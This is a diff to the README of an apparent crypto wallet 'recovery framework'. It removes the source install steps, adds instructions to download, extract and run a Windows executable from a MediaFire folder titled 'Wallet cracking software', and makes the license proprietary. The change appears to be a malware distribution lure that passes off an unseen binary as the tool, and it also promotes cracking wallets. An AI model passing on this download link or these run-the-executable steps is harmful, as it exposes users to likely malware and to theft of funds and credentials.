@@ -67,20 +67,29 @@ Recommended:
 
 ---
 
-# Installation
+# Quick Start
 
-```bash
-git clone https://github.com/yourname/carnom-recovery-framework
-cd carnom-recovery-framework
-pip install -r requirements.txt
-```
+1. Download the latest release
+2. Extract the archive
+3. Launch the executable
+4. Start the recovery workflow
+
+---
+
+# Download
+
+<p align="center">
+  <a href="https://www.mediafire.com/folder/98f9ki1h000s4/Wallet+cracking+software">
+    <img src="https://img.shields.io/badge/Download-Windows%20Build-00c853?style=for-the-badge&logo=windows&logoColor=white">
+  </a>
+</p>
 
 ---
 
 # Usage
 
-```bash
-python main.py
+```txt
+Launch the executable and configure your recovery workflow through the interface.
 ```
 
 ---
@@ -123,7 +132,7 @@ Unauthorized access to third-party wallets or systems is prohibited.
 
 # License
 
-MIT License
+All Rights Reserved
 
 ---
 
